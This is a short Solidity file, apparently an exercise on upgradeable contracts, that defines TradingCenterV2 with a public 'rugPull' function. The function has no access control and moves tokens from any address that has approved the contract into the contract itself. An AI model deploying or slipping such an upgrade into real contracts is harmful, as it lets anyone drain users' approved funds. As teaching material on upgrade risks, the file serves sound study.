// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import { TradingCenter,IERC20 } from "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter{
    function rugPull(IERC20 _token, address from, uint256 amount) public {
        _token.transferFrom(from, address(this), amount);
    }
}